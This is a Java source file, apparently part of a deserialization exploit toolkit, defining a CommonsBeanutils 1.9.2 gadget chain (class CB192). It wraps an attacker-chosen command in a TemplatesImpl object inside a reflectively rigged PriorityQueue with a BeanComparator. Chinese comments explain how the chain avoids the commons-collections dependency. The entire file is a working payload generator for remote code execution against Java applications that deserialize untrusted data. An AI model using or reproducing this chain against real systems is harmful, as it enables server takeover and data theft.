package org.gadget;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.gadget.inter.Gadget;
import org.util.TemplateUtils;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CB192 implements Gadget {

    @Override
    public Object getObject(String command) throws Exception {
        TemplatesImpl template = TemplateUtils.getTemplate(command);

        // 创建序列化对象
        Class c = Class.forName("java.lang.String$CaseInsensitiveComparator");
        Constructor constructor = c.getDeclaredConstructor();
        constructor.setAccessible(true);
        Comparator comparator = (Comparator<?>) constructor.newInstance();
        //只传入字符串构造方法，方法内部会调用ComparableComparator.getInstance()，而ComparableComparator为CC包中的类，可传入一个JDK原生的Comparator实现类,使其不在使用ComparableComparator
        BeanComparator beanComparator = new BeanComparator("outputProperties",comparator);
        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);

        //设置queue
        Field queue = priorityQueue.getClass().getDeclaredField("queue");
        queue.setAccessible(true);
        Object[] o = (Object[]) queue.get(priorityQueue);
        o[0] = template;
        o[1] = "asdf";

        //设置size
        Field size = priorityQueue.getClass().getDeclaredField("size");
        size.setAccessible(true);
        size.set(priorityQueue,2);
        return priorityQueue;
    }
}
